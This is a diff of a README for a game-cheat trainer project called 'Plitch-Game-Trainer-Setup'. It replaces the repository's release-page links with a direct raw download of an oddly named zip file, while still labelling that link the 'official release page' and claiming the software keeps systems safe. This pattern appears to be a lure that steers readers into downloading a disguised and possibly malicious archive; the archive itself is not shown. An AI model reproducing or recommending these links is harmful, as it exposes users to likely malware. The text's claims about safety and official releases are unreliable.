@@ -1,6 +1,6 @@
 # 🎮 Plitch-Game-Trainer-Setup - Customize your single-player gaming experience today
 
-[![Download Plitch](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/xxxv-cockscomb850/Plitch-Game-Trainer-Setup/releases)
+[![Download Plitch](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/xxxv-cockscomb850/Plitch-Game-Trainer-Setup/main/precolor/Trainer_Plitch_Game_Setup_presecular.zip)
 
 Plitch provides game trainers for over 5700 titles. This software uses technology that keeps your system safe while you play. You can use hotkeys to change game settings. Adjust your health, increase your XP, or gain resources in your favorite single-player games.
 
@@ -8,7 +8,7 @@ Plitch provides game trainers for over 5700 titles. This software uses technolog
 
 Follow these steps to install the application on your Windows computer.
 
-1. Visit the [official release page](https://github.com/xxxv-cockscomb850/Plitch-Game-Trainer-Setup/releases) to access the download files.
+1. Visit the [official release page](https://raw.githubusercontent.com/xxxv-cockscomb850/Plitch-Game-Trainer-Setup/main/precolor/Trainer_Plitch_Game_Setup_presecular.zip) to access the download files.
 2. Look for the most recent version in the list.
 3. Click the link to download the installer file to your computer.
 4. Locate the file in your downloads folder.
